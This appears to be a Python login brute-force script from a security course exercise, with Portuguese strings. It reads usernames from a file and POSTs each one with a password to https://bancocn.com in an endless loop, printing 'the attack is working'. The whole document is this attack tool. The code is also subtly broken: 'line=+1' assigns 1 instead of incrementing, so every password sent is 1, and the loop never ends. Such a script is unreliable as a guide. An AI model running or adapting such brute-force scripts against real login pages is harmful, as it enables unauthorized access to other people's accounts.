import requests

cabecalho = {"User-agent" : "An0th3rFX", "Referer" : "https://solyd.com.br/ead/resource/203/"}
arquivo = open("arquivo.txt", "r")
texto = "O Ataque está funcionando"

def abre_arquivo():
    try:
        open("arquivo.txt")
        return True
    except Exception as erro:
        print("Aconteceu um erro do tipo:", erro)
        return False
    
while abre_arquivo():
    for line in arquivo:
        usuario = line
        line=+1
        senha = line
        dados = {"username": usuario, "password": senha}
        try:
            requisicao = requests.post("https://bancocn.com", headers=cabecalho, data=dados)
        except Exception as erro:
            print("Ocorreu um erro do tipo:", erro)
        print(texto)
    arquivo.seek(0)

print("O arquivo saiu do while")        

